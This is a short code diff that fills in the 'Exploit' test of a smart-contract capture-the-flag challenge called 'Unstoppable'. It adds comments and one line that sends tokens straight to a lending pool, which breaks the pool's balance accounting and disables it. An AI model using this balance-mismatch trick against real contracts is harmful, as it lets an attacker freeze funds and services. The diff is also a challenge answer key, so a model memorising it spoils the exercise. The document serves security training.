@@ -39,7 +39,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // The contract keeps track of its balance by thinking user can only deposit through its depositTokens function
+        // But if we deposit from the token contract, then it breaks the lender contract
+        this.token.transfer(this.pool.address, 10);
     });
 
     after(async function () {
